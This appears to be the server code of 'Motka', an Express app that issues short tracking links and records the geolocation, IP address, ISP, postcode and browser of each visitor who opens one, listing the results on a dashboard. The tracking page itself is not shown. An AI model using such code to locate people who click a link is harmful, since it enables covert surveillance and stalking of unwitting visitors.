const express = require('express');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// In-memory store
const links = new Map();   // id -> { id, createdAt, label }
const locations = new Map(); // id -> [{ lat, lng, accuracy, timestamp, ip, userAgent }]

// Create a new tracking link
app.post('/api/links', (req, res) => {
  const id = uuidv4().slice(0, 8);
  const label = req.body.label || 'Untitled';
  links.set(id, { id, label, createdAt: new Date().toISOString() });
  locations.set(id, []);
  res.json({ id, label });
});

// Get all links + their location hits
app.get('/api/links', (req, res) => {
  const result = [];
  for (const [id, link] of links) {
    result.push({
      ...link,
      hits: (locations.get(id) || []).length,
      locations: locations.get(id) || []
    });
  }
  res.json(result.reverse());
});

// Get locations for a specific link
app.get('/api/locations/:id', (req, res) => {
  const id = req.params.id;
  if (!links.has(id)) return res.status(404).json({ error: 'Link not found' });
  res.json(locations.get(id) || []);
});

// Receive location from a visitor
app.post('/api/location/:id', (req, res) => {
  const id = req.params.id;
  // Auto-create link if it doesn't exist (survives redeploys)
  if (!links.has(id)) {
    links.set(id, { id, label: 'Auto-detected', createdAt: new Date().toISOString() });
    locations.set(id, []);
  }

  const { lat, lng, accuracy, city, region, country, isp, ip, zip } = req.body;
  const entry = {
    lat,
    lng,
    accuracy,
    city: city || null,
    region: region || null,
    country: country || null,
    isp: isp || null,
    zip: zip || null,
    timestamp: new Date().toISOString(),
    ip: ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress,
    userAgent: req.headers['user-agent']
  };

  locations.get(id).push(entry);
  console.log(`📍 Location received for [${id}]: ${lat}, ${lng}`);
  res.json({ success: true });
});

// Delete a link
app.delete('/api/links/:id', (req, res) => {
  const id = req.params.id;
  links.delete(id);
  locations.delete(id);
  res.json({ success: true });
});

// Serve the tracking page — always serve it, location POST can fail silently
app.get('/t/:id', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

// Dashboard
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`\n🚀 Motka is running at http://localhost:${PORT}\n`);
});
